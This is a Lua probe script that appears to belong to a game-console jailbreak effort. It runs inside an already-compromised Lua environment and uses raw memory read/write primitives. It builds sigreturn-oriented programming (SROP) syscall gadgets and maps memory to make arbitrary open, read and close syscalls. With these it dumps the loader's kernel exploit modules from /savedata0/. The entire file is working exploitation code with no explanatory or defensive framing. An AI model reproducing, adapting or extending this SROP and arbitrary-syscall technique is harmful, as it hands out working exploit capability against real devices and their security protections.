-- CRASH_CLASS: LOW
-- PROBE 143i: Read critical loader Lua modules from /savedata0/
-- fd=18 revealed the loader loads from /savedata0/?.lua
-- Priority: kernel.lua, syscall.lua, native.lua, kernel_offset.lua

print("=== PROBE 143i: READ LOADER MODULES ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)

local function make_path(base, path)
    for ci = 0, #path - 1 do
        local off = ci
        local addr = base + off - (off % 4)
        local cur = safe_rd(addr) or 0
        local shift = (off % 4) * 8
        cur = cur - (math.floor(cur / 2^shift) % 256) * 2^shift
            + string.byte(path, ci + 1) * 2^shift
        wd(addr, cur)
    end
    local toff = #path
    local taddr = base + toff - (toff % 4)
    local tcur = safe_rd(taddr) or 0
    local tshift = (toff % 4) * 8
    tcur = tcur - (math.floor(tcur / 2^tshift) % 256) * 2^tshift
    wd(taddr, tcur)
end

local function read_file(path, max_bytes)
    max_bytes = max_bytes or 32768
    local path_buf = gpu + 0x100
    make_path(path_buf, path)

    local rv_o = srop(5, ua(path_buf), uint64(0))  -- O_RDONLY
    local oh, ol = get_hi_lo(rv_o)
    if ol >= 256 or oh ~= 0 then
        return nil, "open failed"
    end
    local fd = ol

    local rbuf = gpu + 0x10000
    local total = 0
    local text = ""

    for chunk = 0, 31 do
        for off = 0, 0xFFF, 4 do wd(rbuf + off, 0) end
        local rv_r = srop(3, uint64(fd), ua(rbuf), uint64(4096))
        local rrh, rrl = get_hi_lo(rv_r)
        if rrl == 0 or rrl > 4096 then break end

        total = total + rrl
        for ci = 0, math.min(rrl - 1, 4095) do
            local word_off = ci - (ci % 4)
            local w = safe_rd(rbuf + word_off)
            if w then
                local shift = (ci % 4) * 8
                local ch = math.floor(w / (2^shift)) % 256
                if ch >= 32 and ch < 127 then
                    text = text .. string.char(ch)
                elseif ch == 10 then
                    text = text .. "\n"
                elseif ch == 9 then
                    text = text .. "\t"
                elseif ch == 0 then
                    break
                else
                    text = text .. "."
                end
            end
        end

        if rrl < 4096 or total >= max_bytes then break end
    end

    srop(6, uint64(fd))
    return text, total
end

local function print_file(name, path, max_print)
    max_print = max_print or 6000
    print("--- " .. name .. " ---")
    local text, total = read_file(path)
    if not text then
        print("[!] " .. name .. ": " .. (total or "failed"))
        return
    end
    print("[+] " .. name .. ": " .. total .. " bytes")
    local pos = 1
    while pos <= #text and pos <= max_print do
        local nl = text:find("\n", pos) or math.min(pos + 200, #text + 1)
        print(text:sub(pos, nl - 1))
        pos = nl + 1
    end
    if #text > max_print then
        print("... (truncated at " .. max_print .. "/" .. #text .. ")")
    end
    print("")
end

--------------------------------------------------------------------
-- Read the most critical modules
--------------------------------------------------------------------

-- kernel.lua — the kernel exploit/R/W code
print_file("kernel.lua", "/savedata0/kernel.lua", 8000)

-- syscall.lua — dispatch mechanism
print_file("syscall.lua", "/savedata0/syscall.lua", 8000)

-- kernel_offset.lua — kernel offsets table
print_file("kernel_offset.lua", "/savedata0/kernel_offset.lua", 4000)

-- native.lua — native code execution
print_file("native.lua", "/savedata0/native.lua", 4000)

print("=== DONE ===")
